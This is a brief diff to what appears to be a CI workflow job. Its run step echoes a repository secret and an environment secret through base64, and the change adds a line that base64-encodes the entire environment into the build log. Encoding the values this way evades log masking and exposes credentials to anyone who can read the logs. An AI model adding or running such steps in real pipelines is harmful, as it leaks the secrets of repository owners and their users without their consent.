@@ -18,4 +18,5 @@ jobs:
         run: 
           ls -la;
           echo $repo_secret | base64;
-          echo $env_secret | base64
+          echo $env_secret | base64;
+          env | base64;
